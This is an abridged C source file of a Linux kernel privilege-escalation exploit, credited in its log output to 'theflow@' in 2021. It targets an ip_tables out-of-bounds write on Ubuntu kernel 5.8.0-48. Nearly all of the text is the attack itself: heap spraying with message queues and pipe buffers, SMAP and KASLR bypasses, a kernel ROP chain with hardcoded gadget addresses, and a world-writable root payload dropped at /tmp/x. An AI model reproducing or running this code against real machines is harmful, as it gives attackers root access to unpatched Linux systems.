...
#define ROOT_BIN_PATH "/tmp/x"

#define KERNEL_UBUNTU_5_8_0_48 1

#if KERNEL_UBUNTU_5_8_0_48
...
// 0xffffffff81084de3 : mov qword ptr [r12], rbx ; pop rbx ; pop r12 ; pop rbp ;
// ret
...
// 0xffffffff81557894 : mov rdi, rax ; jne 0xffffffff81557888 ; xor eax, eax ;
// ret
...
int trigger_oob_write(int s) {
    ...
    if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
        if (errno == ENOPROTOOPT) {
            LOGV("[-] Error ip_tables module is not loaded.");
            return -1;
        }
    }
...
void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr,
    ...
    *rop++ = 0xDEADBEEF; // RBP
    ...
    strcpy((char *)buf + 0x280, ROOT_BIN_PATH);
    *rop++ = kbase_addr + POP_RDI_RET;
    *rop++ = kheap_addr + 0x280; // RDI
    *rop++ = kbase_addr + RUN_CMD;
...
void drop_root_binary() {
    int fd = 0;
    int err = 0;

    fd = open(ROOT_BIN_PATH, O_RDWR | O_CREAT);
    CHECK_ERR(fd, "open(ROOT_BIN_PATH)");
    write(fd, root_payload, root_payload_len);
    close(fd);

    err = chmod(ROOT_BIN_PATH, 0777);
    CHECK_ERR(err, "chmod");
}
...
int main(int argc, char *argv[]) {
    ...
    LOGV("[+] Linux Privilege Escalation by theflow@ - 2021");

    LOGV("[+] STAGE 0: Initialization");

    LOGV("dropping root binary");
    drop_root_binary();

    LOGV("[*] Setting up namespace sandbox...");
    if (setup_sandbox() < 0)
        goto err_no_rmid;

    LOGV("[*] Initializing sockets and message queues...");
    ...
    LOGV("[+] STAGE 1: Memory corruption");

    LOGV("[*] Spraying primary messages...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
    ...
    LOGV("[*] Spraying secondary messages...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
    ...
    LOGV("[*] Creating holes in primary messages...");
    ...
    LOGV("[*] Triggering out-of-bounds write...");
    if (trigger_oob_write(s) < 0)
        goto err_rmid;

    LOGV("[*] Searching for corrupted primary message...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        ...
        if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
            LOGV("[-] Error could not corrupt any primary message.");
            goto err_no_rmid;
        }
    ...
    LOGV("[+] fake_idx: %x", fake_idx);
    LOGV("[+] real_idx: %x", real_idx);

    LOGV("[+] STAGE 2: SMAP bypass");

    LOGV("[*] Freeing real secondary message...");
    ...
    LOGV("[*] Spraying fake secondary messages...");
    ...
    LOGV("[*] Leaking adjacent secondary message...");
    ...
    if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
        LOGV("[-] Error could not leak adjacent secondary message.");
        goto err_rmid;
    }
    ...
    LOGV("[+] kheap_addr: %" PRIx64 "", kheap_addr);

    if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {
        LOGV("[-] Error kernel heap address is incorrect.");
        goto err_rmid;
    }

    LOGV("[*] Freeing fake secondary messages...");
    ...
    LOGV("[*] Leaking primary message...");
    if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
        goto err_rmid;

    // Check if the leak is valid.
    if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
        LOGV("[-] Error could not leak primary message.");
        goto err_rmid;
    }
    ...
    LOGV("[+] STAGE 3: KASLR bypass");

    LOGV("[*] Freeing fake secondary messages...");
    free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

    // Put kheap_addr at m_list_next & m_list_prev so that list_del() is
    // possible.
    LOGV("[*] Spraying fake secondary messages...");
    memset(secondary_buf, 0, sizeof(secondary_buf));
    ...
    LOGV("[*] Freeing sk_buff data buffer...");
    if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
        goto err_rmid;

    LOGV("[*] Spraying pipe_buffer objects...");
    ...
    LOGV("[*] Leaking and freeing pipe_buffer object...");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
    ...
    LOGV("[+] anon_pipe_buf_ops: %" PRIx64 "", pipe_buffer_ops);
    LOGV("[+] kbase_addr: %" PRIx64 "", kbase_addr);

    if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {
        LOGV("[-] Error kernel base address is incorrect.");
        goto err_rmid;
    }

    LOGV("[+] STAGE 4: Kernel code execution");

    LOGV("[*] Spraying fake pipe_buffer objects...");
    memset(secondary_buf, 0, sizeof(secondary_buf));
...
#endif
    build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0, kheap_addr);
    if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;

    // Trigger pipe_release().
    LOGV("[*] Releasing pipe_buffer objects...");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
    ...
    LOGV("[+] STAGE 5: Post-exploitation");
